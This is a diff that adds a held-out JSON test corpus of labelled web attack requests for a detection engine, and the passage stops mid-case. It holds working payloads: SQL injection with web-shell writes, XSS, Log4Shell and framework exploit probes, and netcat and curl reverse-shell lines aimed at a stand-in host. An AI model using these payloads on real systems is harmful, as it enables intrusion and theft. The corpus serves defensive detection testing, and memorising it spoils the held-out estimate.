@@ -1,0 +1,1935 @@
+{
+  "version": "heldout-v2",
+  "created": "2026-11-04",
+  "provenance": {
+    "description": "Third batch, written to produce the first held-out estimate since heldout_v1 was consumed as a tuning set. Techniques were chosen because they are absent from independent_v1.json and heldout_v1.json, so the engine was not corrected against them.",
+    "authorship": "Drafted by an AI assistant at the owner's request on 2026-11-04. Payloads are hand-written from publicly documented catalogues that the assistant recalled (OWASP CRS rules and WSTG, PortSwigger Web Security Academy, PayloadsAllTheThings, Log4Shell obfuscation notes, CVE write-ups for Confluence/Drupal/Struts/Spring/PHP-CGI, RFC 7519 for JWT, WordPress and WooCommerce developer docs for the probes and the benign shapes). They were NOT copied from a fetched file, so each note names the documented technique rather than a URL; treat the catalogue attribution as approximate.",
+    "labeling_protocol": "Every label and category was fixed in this file before any engine call. The engine was never consulted to decide a label, and no case was added because the engine happened to block or allow something. corpus/heldout_v2_report.json records the first run.",
+    "benign_set": "The 57 controls are plausible traffic for a small Chilean e-commerce site (Spanish product and search text, WooCommerce and payment callbacks, invoices and CSV uploads, config forms that legitimately contain paths, IPs and shell-looking strings). They are written by hand, not sampled from a customer's access log, so this measures false positives against imagined traffic, not against real traffic.",
+    "new_categories": "nosql_injection, xxe, ssti, http_response_splitting, host_header_injection and malicious_upload are not names AttackCategory knows. They are kept as their own categories instead of being folded into a known one, so a miss is reported as a missing rule family rather than as a wrong attribution of a rule that exists.",
+    "status": "HELD OUT AT THE MOMENT OF WRITING. The first run below is the estimate. Any later change to the engine made in response to a case in this file turns it into a regression suite and requires a new batch (heldout_v3) — see rule 4 in corpus/README.md.",
+    "known_limitations": [
+      "155 hand-written cases are a floor, not a certification.",
+      "Attack payloads are single-request signatures; nothing here measures multi-request or stateful evasion, payload encodings a specific upstream would decode, or traffic that arrives over HTTP/2 binary framing.",
+      "The benign set cannot contain the shapes its author did not think of, which is exactly where production false positives come from.",
+      "Detection here runs on the SAT engine with default configuration and one request as the only input; no upstream, no rule sync, no verdict state."
+    ]
+  },
+  "cases": [
+    {
+      "id": "sqli-v2-extractvalue-error",
+      "category": "sql_injection",
+      "label": "malicious",
+      "note": "Error-based extraction through MySQL extractvalue() with a 0x7e prefix.",
+      "request": {
+        "method": "GET",
+        "path": "/",
+        "query": "id=1' AND extractvalue(1,concat(0x7e,(SELECT group_concat(user,0x3a,password) FROM users)))-- -",
+        "body": ""
+      }
+    },
+    {
+      "id": "sqli-v2-updatexml-error",
+      "category": "sql_injection",
+      "label": "malicious",
+      "note": "Error-based extraction through updatexml() on an invalid XPath.",
+      "request": {
+        "method": "GET",
+        "path": "/product",
+        "query": "sku=X' AND updatexml(1,concat(0x7e,version(),0x7e),1) OR 'a'='a",
+        "body": ""
+      }
+    },
+    {
+      "id": "sqli-v2-mssql-waitfor",
+      "category": "sql_injection",
+      "label": "malicious",
+      "note": "MSSQL stacked time blind with WAITFOR DELAY.",
+      "request": {
+        "method": "GET",
+        "path": "/report",
+        "query": "year=2026'; WAITFOR DELAY '0:0:15'--",
+        "body": ""
+      }
+    },
+    {
+      "id": "sqli-v2-mssql-char-concat",
+      "category": "sql_injection",
+      "label": "malicious",
+      "note": "UNION built with CHAR() calls to avoid quote and keyword signatures.",
+      "request": {
+        "method": "GET",
+        "path": "/",
+        "query": "q=-1 UNION SELECT CHAR(115)+CHAR(97)+CHAR(32)+CHAR(49),NULL,NULL",
+        "body": ""
+      }
+    },
+    {
+      "id": "sqli-v2-hex-literal",
+      "category": "sql_injection",
+      "label": "malicious",
+      "note": "Payload expressed as a MySQL hexadecimal literal (decodes to 'union select 1,2').",
+      "request": {
+        "method": "GET",
+        "path": "/",
+        "query": "id=0x556e696f6e2073656c65637420312c32",
+        "body": ""
+      }
+    },
+    {
+      "id": "sqli-v2-procedure-analyse",
+      "category": "sql_injection",
+      "label": "malicious",
+      "note": "ORDER BY injection into extractvalue() via procedure analyse().",
+      "request": {
+        "method": "GET",
+        "path": "/listar",
+        "query": "orden=nombre,procedure analyse(extractvalue(1,concat(0x7e,(SELECT database()))),1)-- -",
+        "body": ""
+      }
+    },
+    {
+      "id": "sqli-v2-pg-catalog",
+      "category": "sql_injection",
+      "label": "malicious",
+      "note": "PostgreSQL catalog read through a UNION against pg_catalog.pg_tables.",
+      "request": {
+        "method": "GET",
+        "path": "/api/buscar",
+        "query": "tabla=x' UNION SELECT schemaname,tablename FROM pg_catalog.pg_tables-- -",
+        "body": ""
+      }
+    },
+    {
+      "id": "sqli-v2-into-outfile",
+      "category": "sql_injection",
+      "label": "malicious",
+      "note": "UNION with INTO OUTFILE writing a PHP web shell into the docroot.",
+      "request": {
+        "method": "POST",
+        "path": "/api/export",
+        "query": "",
+        "body": "col=1' UNION SELECT '<?php system($_GET[0]);?>' INTO OUTFILE '/var/www/html/x.php'-- -"
+      }
+    },
+    {
+      "id": "sqli-v2-json-operator",
+      "category": "sql_injection",
+      "label": "malicious",
+      "note": "Tautology inside a JSON login body, quotes balanced for the parser.",
+      "request": {
+        "method": "POST",
+        "path": "/api/login",
+        "query": "",
+        "body": "{\"email\": \"admin@tienda.cl' OR '1'='1\", \"clave\": \"x\"}"
+      }
+    },
+    {
+      "id": "sqli-v2-comment-separator",
+      "category": "sql_injection",
+      "label": "malicious",
+      "note": "Whitespace replaced by MySQL executable comments between the keywords.",
+      "request": {
+        "method": "GET",
+        "path": "/",
+        "query": "id=1'/*!UNION*//*!SELECT*/user,pass/*!FROM*/users-- -",
+        "body": ""
+      }
+    },
+    {
+      "id": "sqli-v2-hpp-second-value",
+      "category": "sql_injection",
+      "label": "malicious",
+      "note": "HTTP parameter pollution: benign first value, injected second value for parsers that keep the last.",
+      "request": {
+        "method": "GET",
+        "path": "/",
+        "query": "id=7&id[]=1' OR 1=1;",
+        "body": ""
+      }
+    },
+    {
+      "id": "sqli-v2-information-schema-header",
+      "category": "sql_injection",
+      "label": "malicious",
+      "note": "information_schema enumeration placed in the Referer header.",
+      "request": {
+        "method": "GET",
+        "path": "/",
+        "query": "page=1",
+        "body": "",
+        "headers": {
+          "referer": "https://tienda.cl/catalogo?cat=1 UNION SELECT table_name,column_name FROM information_schema.columns"
+        }
+      }
+    },
+    {
+      "id": "nosql-v2-ne-auth-bypass",
+      "category": "nosql_injection",
+      "label": "malicious",
+      "note": "MongoDB operator injection that makes the credential match non-empty.",
+      "request": {
+        "method": "POST",
+        "path": "/api/sesion",
+        "query": "",
+        "body": "{\"email\": \"admin@tienda.cl\", \"clave\": {\"$ne\": null}}"
+      }
+    },
+    {
+      "id": "nosql-v2-gt-regex",
+      "category": "nosql_injection",
+      "label": "malicious",
+      "note": "$gt with an empty string plus $regex to brute a value character by character.",
+      "request": {
+        "method": "POST",
+        "path": "/api/sesion",
+        "query": "",
+        "body": "{\"email\": {\"$regex\": \"^a\"}, \"clave\": {\"$gt\": \"\"}}"
+      }
+    },
+    {
+      "id": "nosql-v2-query-string-operator",
+      "category": "nosql_injection",
+      "label": "malicious",
+      "note": "Operator expressed through query-parameter syntax accepted by some body parsers.",
+      "request": {
+        "method": "GET",
+        "path": "/api/sesion",
+        "query": "email[$ne]=1&clave[$ne]=1",
+        "body": ""
+      }
+    },
+    {
+      "id": "xss-v2-body-onload",
+      "category": "xss",
+      "label": "malicious",
+      "note": "Document-level injection through a body onload handler.",
+      "request": {
+        "method": "POST",
+        "path": "/comentario",
+        "query": "",
+        "body": "<body onload=alert(document.domain)>"
+      }
+    },
+    {
+      "id": "xss-v2-details-ontoggle",
+      "category": "xss",
+      "label": "malicious",
+      "note": "toggle event on an open details element, no script tag and no onerror.",
+      "request": {
+        "method": "POST",
+        "path": "/comentario",
+        "query": "",
+        "body": "<details open ontoggle=alert(1)>x</details>"
+      }
+    },
+    {
+      "id": "xss-v2-autofocus-focus",
+      "category": "xss",
+      "label": "malicious",
+      "note": "autofocus plus onfocus on an input, fires without user interaction.",
+      "request": {
+        "method": "POST",
+        "path": "/perfil",
+        "query": "",
+        "body": "<input autofocus onfocus=alert(1) value=x>"
+      }
+    },
+    {
+      "id": "xss-v2-source-onerror",
+      "category": "xss",
+      "label": "malicious",
+      "note": "source element inside video with a failing src.",
+      "request": {
+        "method": "POST",
+        "path": "/comentario",
+        "query": "",
+        "body": "<video><source onerror=\"alert(1)\">"
+      }
+    },
+    {
+      "id": "xss-v2-marquee-onstart",
+      "category": "xss",
+      "label": "malicious",
+      "note": "marquee onstart handler.",
+      "request": {
+        "method": "POST",
+        "path": "/comentario",
+        "query": "",
+        "body": "<marquee onstart=alert(1)>"
+      }
+    },
+    {
+      "id": "xss-v2-svg-cdata-script",
+      "category": "xss",
+      "label": "malicious",
+      "note": "script inside SVG wrapped in a CDATA section.",
+      "request": {
+        "method": "POST",
+        "path": "/avatar.svg",
+        "query": "",
+        "body": "<svg><script type=\"text/javascript\"><![CDATA[alert(1)]]></script></svg>"
+      }
+    },
+    {
+      "id": "xss-v2-xlink-href",
+      "category": "xss",
+      "label": "malicious",
+      "note": "xlink:href attribute carrying the javascript scheme.",
+      "request": {
+        "method": "POST",
+        "path": "/banner",
+        "query": "",
+        "body": "<svg><a xlink:href=\"javascript:alert(1)\"><text x=0>y</text></a></svg>"
+      }
+    },
+    {
+      "id": "xss-v2-keyframes-animationend",
+      "category": "xss",
+      "label": "malicious",
+      "note": "animationend handler paired with a keyframe declaration.",
+      "request": {
+        "method": "POST",
+        "path": "/comentario",
+        "query": "",
+        "body": "<style>@keyframes v{to{opacity:0}}</style><div style=\"animation-name:v\" onanimationend=alert(1)>z</div>"
+      }
+    },
+    {
+      "id": "xss-v2-object-data",
+      "category": "xss",
+      "label": "malicious",
+      "note": "object element loading the scheme directly.",
+      "request": {
+        "method": "POST",
+        "path": "/embed",
+        "query": "",
+        "body": "<object data=\"javascript:alert(1)\">"
+      }
+    },
+    {
+      "id": "xss-v2-dom-sink-param",
+      "category": "xss",
+      "label": "malicious",
+      "note": "javascript scheme in a return-url parameter consumed by a DOM sink.",
+      "request": {
+        "method": "GET",
+        "path": "/login",
+        "query": "next=javascript:alert(document.cookie)",
+        "body": ""
+      }
+    },
+    {
+      "id": "xss-v2-form-submit-focus",
+      "category": "xss",
+      "label": "malicious",
+      "note": "form onfocus triggered by tabindex, no image or script element.",
+      "request": {
+        "method": "POST",
+        "path": "/comentario",
+        "query": "",
+        "body": "<form id=p tabindex=1 onfocus=alert(1)></form>"
+      }
+    },
+    {
+      "id": "xss-v2-iframe-srcdoc-entity",
+      "category": "xss",
+      "label": "malicious",
+      "note": "iframe srcdoc holding an img onerror payload.",
+      "request": {
+        "method": "POST",
+        "path": "/widget",
+        "query": "",
+        "body": "<iframe srcdoc=\"<img src=x onerror=alert(1)>\">"
+      }
+    },
+    {
+      "id": "rce-v2-plus-separator",
+      "category": "command_injection",
+      "label": "malicious",
+      "note": "Space replaced by plus, semicolon separator.",
+      "request": {
+        "method": "GET",
+        "path": "/ping",
+        "query": "host=127.0.0.1;+cat+/etc/passwd",
+        "body": ""
+      }
+    },
+    {
+      "id": "rce-v2-amp-amp-windows",
+      "category": "command_injection",
+      "label": "malicious",
+      "note": "Windows chain with && and net user.",
+      "request": {
+        "method": "GET",
+        "path": "/tools/ping",
+        "query": "ip=8.8.8.8&&net+user&&ver",
+        "body": ""
+      }
+    },
+    {
+      "id": "rce-v2-python-import-one-liner",
+      "category": "command_injection",
+      "label": "malicious",
+      "note": "Interpreter one-liner using __import__ so no single shell keyword stands alone.",
+      "request": {
+        "method": "GET",
+        "path": "/tools",
+        "query": "host=;python3 -c __import__(%27os%27).system(%27id%27)",
+        "body": ""
+      }
+    },
+    {
+      "id": "rce-v2-base64-pipe",
+      "category": "command_injection",
+      "label": "malicious",
+      "note": "Encoded command decoded and piped into a shell.",
+      "request": {
+        "method": "GET",
+        "path": "/ping",
+        "query": "ip=;echo Y3VybCAyMDMuMC4xMTMuOXxiYXNo|base64 -d|sh",
+        "body": ""
+      }
+    },
+    {
+      "id": "rce-v2-reverse-shell-nc",
+      "category": "command_injection",
+      "label": "malicious",
+      "note": "Netcat reverse shell toward a TEST-NET address.",
+      "request": {
+        "method": "GET",
+        "path": "/descarga",
+        "query": "file=a;nc 203.0.113.9 4444 -e /bin/sh",
+        "body": ""
+      }
+    },
+    {
+      "id": "rce-v2-shellshock-user-agent",
+      "category": "command_injection",
+      "label": "malicious",
+      "note": "Shellshock function prefix smuggled in the User-Agent string.",
+      "request": {
+        "method": "GET",
+        "path": "/index.html",
+        "query": "",
+        "body": "",
+        "headers": {
+          "user-agent": "() { :;}; /usr/bin/curl 203.0.113.9"
+        }
+      }
+    },
+    {
+      "id": "rce-v2-runtime-getruntime",
+      "category": "command_injection",
+      "label": "malicious",
+      "note": "Java Runtime.exec built from a String array.",
+      "request": {
+        "method": "POST",
+        "path": "/api/log",
+        "query": "",
+        "body": "{\"msg\": \"String[]cmd={\\\"/bin/sh\\\",\\\"-c\\\",\\\"id\\\"};Runtime.getRuntime().exec(cmd);\"}"
+      }
+    },
+    {
+      "id": "rce-v2-busybox-telnet",
+      "category": "command_injection",
+      "label": "malicious",
+      "note": "busybox telnet piped into a shell.",
+      "request": {
+        "method": "GET",
+        "path": "/admin/tools",
+        "query": "host=x;busybox telnet 203.0.113.9 9001|/bin/sh",
+        "body": ""
+      }
+    },
+    {
+      "id": "lfi-v2-php-filter",
+      "category": "path_traversal",
+      "label": "malicious",
+      "note": "php://filter base64 wrapper to read a protected PHP source.",
+      "request": {
+        "method": "GET",
+        "path": "/pago",
+        "query": "hook=../../index&config=php://filter/convert.base64-encode/resource=wp-config.php",
+        "body": ""
+      }
+    },
+    {
+      "id": "lfi-v2-php-filter-iconv",
+      "category": "path_traversal",
+      "label": "malicious",
+      "note": "php://filter chain with convert.iconv used to obfuscate the wrapper name.",
+      "request": {
+        "method": "GET",
+        "path": "/descarga",
+        "query": "archivo=php://filter/read=convert.iconv.utf-8.utf-16/resource=../../config/database.yml",
+        "body": ""
+      }
+    },
+    {
+      "id": "lfi-v2-expect-wrapper",
+      "category": "path_traversal",
+      "label": "malicious",
+      "note": "expect:// wrapper executing a command through the include path.",
+      "request": {
+        "method": "GET",
+        "path": "/index.php",
+        "query": "pagina=expect://id",
+        "body": ""
+      }
+    },
+    {
+      "id": "lfi-v2-nested-dotdot",
+      "category": "path_traversal",
+      "label": "malicious",
+      "note": "Nested ....// sequences that collapse to ../../ after one filtering pass.",
+      "request": {
+        "method": "GET",
+        "path": "/files",
+        "query": "ruta=....//....//....//etc/shadow",
+        "body": ""
+      }
+    },
+    {
+      "id": "lfi-v2-encoded-literal-dots",
+      "category": "path_traversal",
+      "label": "malicious",
+      "note": "Percent-encoded single dots and slash, one decoding pass.",
+      "request": {
+        "method": "GET",
+        "path": "/archivos",
+        "query": "f=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+        "body": ""
+      }
+    },
+    {
+      "id": "lfi-v2-proc-environ",
+      "category": "path_traversal",
+      "label": "malicious",
+      "note": "Direct read of /proc/self/environ to harvest session secrets.",
+      "request": {
+        "method": "GET",
+        "path": "/ver",
+        "query": "ruta=/proc/self/environ",
+        "body": ""
+      }
+    },
+    {
+      "id": "lfi-v2-windows-sam",
+      "category": "path_traversal",
+      "label": "malicious",
+      "note": "Windows SAM hive through a backslash traversal chain.",
+      "request": {
+        "method": "GET",
+        "path": "/descarga",
+        "query": "archivo=..\\..\\..\\windows\\system32\\config\\sam",
+        "body": ""
+      }
+    },
+    {
+      "id": "lfi-v2-log-poison-include",
+      "category": "path_traversal",
+      "label": "malicious",
+      "note": "Include of the web server log after writing the payload into it.",
+      "request": {
+        "method": "GET",
+        "path": "/index.php",
+        "query": "lang=/var/log/nginx/access.log",
+        "body": ""
+      }
+    },
+    {
+      "id": "ssrf-v2-octal-loopback",
+      "category": "ssrf",
+      "label": "malicious",
+      "note": "Loopback in octal form (0177.0.0.1).",
+      "request": {
+        "method": "GET",
+        "path": "/preview",
+        "query": "url=http://0177.0.0.1/admin",
+        "body": ""
+      }
+    },
+    {
+      "id": "ssrf-v2-zero-host",
+      "category": "ssrf",
+      "label": "malicious",
+      "note": "Zero address resolving to the local host.",
+      "request": {
+        "method": "GET",
+        "path": "/fetch",
+        "query": "target=http://0:8080/latest/meta-data/",
+        "body": ""
+      }
+    },
+    {
+      "id": "ssrf-v2-nip-io",
+      "category": "ssrf",
+      "label": "malicious",
+      "note": "Public wildcard DNS name that resolves to 127.0.0.1.",
+      "request": {
+        "method": "GET",
+        "path": "/proxy",
+        "query": "url=http://admin.127.0.0.1.nip.io/",
+        "body": ""
+      }
+    },
+    {
+      "id": "ssrf-v2-cluster-dns",
+      "category": "ssrf",
+      "label": "malicious",
+      "note": "Internal Kubernetes service DNS name.",
+      "request": {
+        "method": "GET",
+        "path": "/webhook",
+        "query": "endpoint=http://api.interno.svc.cluster.local:8443/admin/users",
+        "body": ""
+      }
+    },
+    {
+      "id": "ssrf-v2-ftp-scheme",
+      "category": "ssrf",
+      "label": "malicious",
+      "note": "FTP scheme used to reach an internal listener.",
+      "request": {
+        "method": "GET",
+        "path": "/cargar",
+        "query": "origen=ftp://127.0.0.1:21/",
+        "body": ""
+      }
+    },
+    {
+      "id": "ssrf-v2-gopher-smtp",
+      "category": "ssrf",
+      "label": "malicious",
+      "note": "gopher:// used to speak SMTP against localhost:25.",
+      "request": {
+        "method": "GET",
+        "path": "/notify",
+        "query": "hook=gopher://127.0.0.1:25/_HELO%20x%0AMAIL%20FROM:%3Ca@b.c%3E",
+        "body": ""
+      }
+    },
+    {
+      "id": "ssrf-v2-portscan-list",
+      "category": "ssrf",
+      "label": "malicious",
+      "note": "Internal port scan expressed as a list of URLs in one body.",
+      "request": {
+        "method": "POST",
+        "path": "/api/revisar",
+        "query": "",
+        "body": "{\"urls\": [\"http://10.0.0.1:22/\", \"http://10.0.0.1:3306/\", \"http://10.0.0.1:6379/\"]}"
+      }
+    },
+    {
+      "id": "ssrf-v2-ecs-credentials",
+      "category": "ssrf",
+      "label": "malicious",
+      "note": "AWS ECS task-role credential endpoint (169.254.170.2).",
+      "request": {
+        "method": "GET",
+        "path": "/importar",
+        "query": "fuente=http://169.254.170.2//v2/credentials/abc123",
+        "body": ""
+      }
+    },
+    {
+      "id": "graphql-v2-ast-injection-variable",
+      "category": "graphql_abuse",
+      "label": "malicious",
+      "note": "Introspection injected through a variable string, closing the enclosing selection set.",
+      "request": {
+        "method": "POST",
+        "path": "/graphql",
+        "query": "",
+        "body": "{\"query\": \"query($n:String!){user(name:$n){id}}\", \"variables\": {\"n\": \"\\\"}...{__schema{types{name fields{name}}}}#\"}}"
+      }
+    },
+    {
+      "id": "graphql-v2-batch-flood",
+      "category": "graphql_abuse",
+      "label": "malicious",
+      "note": "Batched array of identical heavy queries used to multiply the cost of one request.",
+      "request": {
+        "method": "POST",
+        "path": "/graphql",
+        "query": "",
+        "body": "[{\"query\": \"{products{sku price stock stock stock}}\"}, {\"query\": \"{products{sku price stock stock stock}}\"}, {\"query\": \"{products{sku price stock stock stock}}\"}, {\"query\": \"{products{sku price stock stock stock}}\"}, {\"query\": \"{products{sku price stock stock stock}}\"}, {\"query\": \"{products{sku price stock stock stock}}\"}, {\"query\": \"{products{sku price stock stock stock}}\"}, {\"query\": \"{products{sku price stock stock stock}}\"}, {\"query\": \"{products{sku price stock stock stock}}\"}, {\"query\": \"{products{sku price stock stock stock}}\"}, {\"query\": \"{products{sku price stock stock stock}}\"}, {\"query\": \"{products{sku price stock stock stock}}\"}]"
+      }
+    },
+    {
+      "id": "graphql-v2-alias-field-enum",
+      "category": "graphql_abuse",
+      "label": "malicious",
+      "note": "Alias flood enumerating candidate fields plus a schema lookup in one request.",
+      "request": {
+        "method": "POST",
+        "path": "/graphql",
+        "query": "",
+        "body": "{\"query\": \"{a0:__typename,a1:__typename,a2:__typename,a3:__typename,a4:__typename,a5:__typename,a6:__typename,a7:__typename,a8:__typename,a9:__typename,a10:__typename,a11:__typename,x:{__schema{queryType{name}}}}\"}"
+      }
+    },
+    {
+      "id": "graphql-v2-introspection-in-get",
+      "category": "graphql_abuse",
+      "label": "malicious",
+      "note": "Full introspection sent unencoded in a GET query parameter.",
+      "request": {
+        "method": "GET",
+        "path": "/graphql",
+        "query": "query={__schema{types{fields{args{name type{name}}}}}}",
+        "body": ""
+      }
+    },
+    {
+      "id": "proto-v2-constructor-prototype",
+      "category": "prototype_pollution",
+      "label": "malicious",
+      "note": "Pollution reached through constructor.prototype instead of the filtered __proto__ key.",
+      "request": {
+        "method": "POST",
+        "path": "/api/perfil",
+        "query": "",
+        "body": "{\"constructor\": {\"prototype\": {\"rol\": \"admin\"}}}"
+      }
+    },
+    {
+      "id": "proto-v2-bracket-query",
+      "category": "prototype_pollution",
+      "label": "malicious",
+      "note": "Bracket property syntax in a query parameter.",
+      "request": {
+        "method": "GET",
+        "path": "/config",
+        "query": "constructor[prototype][rol]=admin",
+        "body": ""
+      }
+    },
+    {
+      "id": "proto-v2-nested-array",
+      "category": "prototype_pollution",
+      "label": "malicious",
+      "note": "Pollution hidden inside an array element of a nested object.",
+      "request": {
+        "method": "POST",
+        "path": "/api/form",
+        "query": "",
+        "body": "{\"bloques\": [{\"id\": 1}, {\"__proto__\": {\"arrendado\": true}}]}"
+      }
+    },
+    {
+      "id": "proto-v2-formdata",
+      "category": "prototype_pollution",
+      "label": "malicious",
+      "note": "Pollution sent as urlencoded form fields.",
+      "request": {
+        "method": "POST",
+        "path": "/api/perfil",
+        "query": "",
+        "body": "constructor.prototype.isAdmin=true"
+      }
+    },
+    {
+      "id": "jwt-v2-alg-confusion-jwk",
+      "category": "jwt_tampering",
+      "label": "malicious",
+      "note": "RS256 to HS256 algorithm confusion carrying an attacker JWK in the header.",
+      "request": {
+        "method": "GET",
+        "path": "/api/cuenta",
+        "query": "",
+        "body": "",
+        "headers": {
+          "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBQiIsIm4iOiJ4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4In19.eyJzdWIiOiJhZG1pbkB0aWVuZGEuY2wiLCJyb2wiOiJhZG1pbiIsImV4cCI6MTg5MzQ1NjAwMH0."
+        }
+      }
+    },
+    {
+      "id": "jwt-v2-kid-sqli",
+      "category": "jwt_tampering",
+      "label": "malicious",
+      "note": "SQL injection in the kid header parameter, for verifiers that look the key up in a database.",
+      "request": {
+        "method": "GET",
+        "path": "/api/cuenta",
+        "query": "",
+        "body": "",
+        "headers": {
+          "authorization": "Bearer eyJhbGciOiJIUzI1NiIsImtpZCI6IjEnIE9SICcxJz0nMSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sIjoiYWRtaW4ifQ."
+        }
+      }
+    },
+    {
+      "id": "jwt-v2-mixedcase-none",
+      "category": "jwt_tampering",
+      "label": "malicious",
+      "note": "alg written NoNe to slip a case-sensitive comparison.",
+      "request": {
+        "method": "GET",
+        "path": "/api/cuenta",
+        "query": "",
+        "body": "",
+        "headers": {
+          "authorization": "Bearer eyJhbGciOiJOb05lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbCI6ImFkbWluIn0."
+        }
+      }
+    },
+    {
+      "id": "jwt-v2-crit-extension",
+      "category": "jwt_tampering",
+      "label": "malicious",
+      "note": "crit header used to make a verifier skip the signature check.",
+      "request": {
+        "method": "GET",
+        "path": "/api/cuenta",
+        "query": "",
+        "body": "",
+        "headers": {
+          "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImNyaXQiOlsiYjY0Il0sImI2NCI6ZmFsc2V9.eyJzdWIiOiJhZG1pbiIsInJvbCI6ImFkbWluIn0.AAAA"
+        }
+      }
+    },
+    {
+      "id": "log4j-v2-default-expansion",
+      "category": "framework_exploit_probe",
+      "label": "malicious",
+      "note": "JNDI lookup assembled from four empty-default expansions.",
+      "request": {
+        "method": "POST",
+        "path": "/api/consulta",
+        "query": "",
+        "body": "{\"msg\": \"${${::-j}${::-n}${::-d}${::-i}:ldap://203.0.113.9/a}\"}"
+      }
+    },
+    {
+      "id": "log4j-v2-lower-lookup",
+      "category": "framework_exploit_probe",
+      "label": "malicious",
+      "note": "${lower:...} used to build the scheme in a POSTed form field.",
+      "request": {
+        "method": "POST",
+        "path": "/contacto",
+        "query": "",
+        "body": "asunto=${${lower:jndi}:${lower:ldap}://203.0.113.9/x}"
+      }
+    },
+    {
+      "id": "ognl-v2-confluence-url",
+      "category": "framework_exploit_probe",
+      "label": "malicious",
+      "note": "Confluence OGNL expression evaluated from the request path.",
+      "request": {
+        "method": "GET",
+        "path": "/%24%7B%281337%2B1337%29%7D",
+        "query": "",
+        "body": ""
+      }
+    },
+    {
+      "id": "spel-v2-function-routing-header",
+      "category": "framework_exploit_probe",
+      "label": "malicious",
+      "note": "Spring Cloud Function routing-expression header with T(java.lang.Runtime).",
+      "request": {
+        "method": "GET",
+        "path": "/function",
+        "query": "",
+        "body": "",
+        "headers": {
+          "spring.cloud.function.routing-expression": "T(java.lang.Runtime).getRuntime().exec('curl 203.0.113.9')"
+        }
+      }
+    },
+    {
+      "id": "struts-v2-redirect-ognl",
+      "category": "framework_exploit_probe",
+      "label": "malicious",
+      "note": "Struts redirect: prefix with an OGNL ProcessBuilder expression in the query.",
+      "request": {
+        "method": "GET",
+        "path": "/action",
+        "query": "redirect:%24%7Bnew%20java.lang.ProcessBuilder('id').start()%7D",
+        "body": ""
+      }
+    },
+    {
+      "id": "drupal-v2-drupalgeddon-array",
+      "category": "framework_exploit_probe",
+      "label": "malicious",
+      "note": "Drupalgeddon2 render-array parameters with a URL-encoded shell prefix.",
+      "request": {
+        "method": "GET",
+        "path": "/user/register",
+        "query": "mail=%23post_render%5B%5D=exec&mail=%23markup=python%20-c%20%22print(1)%22&element_parents=account/mail/%23value",
+        "body": ""
+      }
+    },
+    {
+      "id": "php-v2-cgi-arg-injection",
+      "category": "framework_exploit_probe",
+      "label": "malicious",
+      "note": "PHP CGI argument injection through the query string with a data:// prepend.",
+      "request": {
+        "method": "GET",
+        "path": "/cgi-bin/php",
+        "query": "-d+allow_url_include%3d1+-d+auto_prepend_file%3ddata://text/plain,%3C%3Fphp%20system(%27id%27)%3B%3F%3E",
+        "body": ""
+      }
+    },
+    {
+      "id": "jenkins-v2-script-console",
+      "category": "framework_exploit_probe",
+      "label": "malicious",
+      "note": "Groovy submitted to the Jenkins script console path.",
+      "request": {
+        "method": "POST",
+        "path": "/script",
+        "query": "",
+        "body": "new ProcessBuilder(['cat','/etc/passwd']).redirectErrorStream(true).start().text"
+      }
+    },
+    {
+      "id": "exposure-v2-aws-credentials",
+      "category": "sensitive_exposure_probe",
+      "label": "malicious",
+      "note": "Attempt to read the AWS SDK credentials file.",
+      "request": {
+        "method": "GET",
+        "path": "/.aws/credentials",
+        "query": "",
+        "body": ""
+      }
+    },
+    {
+      "id": "exposure-v2-apache-status",
+      "category": "sensitive_exposure_probe",
+      "label": "malicious",
+      "note": "Apache server-status extended report.",
+      "request": {
+        "method": "GET",
+        "path": "/server-status",
+        "query": "auto",
+        "body": ""
+      }
+    },
+    {
+      "id": "exposure-v2-sql-dump",
+      "category": "sensitive_exposure_probe",
+      "label": "malicious",
+      "note": "Predictable database backup path.",
+      "request": {
+        "method": "GET",
+        "path": "/backup/dump.sql",
+        "query": "",
+        "body": ""
+      }
+    },
+    {
+      "id": "exposure-v2-phpinfo",
+      "category": "sensitive_exposure_probe",
+      "label": "malicious",
+      "note": "Left-over phpinfo page probe.",
+      "request": {
+        "method": "GET",
+        "path": "/phpinfo.php",
+        "query": "",
+        "body": ""
+      }
+    },
+    {
+      "id": "exposure-v2-eval-stdin",
+      "category": "sensitive_exposure_probe",
+      "label": "malicious",
+      "note": "PHPUnit eval-stdin backdoor path.",
+      "request": {
+        "method": "POST",
+        "path": "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
+        "query": "",
+        "body": "<?php system('id');?>"
+      }
+    },
+    {
+      "id": "exposure-v2-ssh-key",
+      "category": "sensitive_exposure_probe",
+      "label": "malicious",
+      "note": "Private key file read probe.",
+      "request": {
+        "method": "GET",
+        "path": "/.ssh/id_rsa",
+        "query": "",
+        "body": ""
+      }
+    },
+    {
+      "id": "exposure-v2-env-production",
+      "category": "sensitive_exposure_probe",
+      "label": "malicious",
+      "note": "Laravel production env file probe.",
+      "request": {
+        "method": "GET",
+        "path": "/web/.env.production",
+        "query": "",
+        "body": ""
+      }
+    },
+    {
+      "id": "wp-v2-rest-user-enum",
+      "category": "cms_wordpress_probe",
+      "label": "malicious",
+      "note": "REST user enumeration endpoint.",
+      "request": {
+        "method": "GET",
+        "path": "/wp-json/wp/v2/users",
+        "query": "",
+        "body": ""
+      }
+    },
+    {
+      "id": "wp-v2-rest-route-param",
+      "category": "cms_wordpress_probe",
+      "label": "malicious",
+      "note": "Same enumeration reached through rest_route on a non-WordPress host.",
+      "request": {
+        "method": "GET",
+        "path": "/",
+        "query": "rest_route=/wp/v2/users/1",
+        "body": ""
+      }
+    },
+    {
+      "id": "wp-v2-admin-ajax-lfi",
+      "category": "cms_wordpress_probe",
+      "label": "malicious",
+      "note": "admin-ajax revslider LFI toward wp-config.php.",
+      "request": {
+        "method": "GET",
+        "path": "/wp-admin/admin-ajax.php",
+        "query": "action=revslider_show_image&img=../wp-config.php",
+        "body": ""
+      }
+    },
+    {
+      "id": "wp-v2-xmlrpc-multicall",
+      "category": "cms_wordpress_probe",
+      "label": "malicious",
+      "note": "xmlrpc multicall brute-force amplification.",
+      "request": {
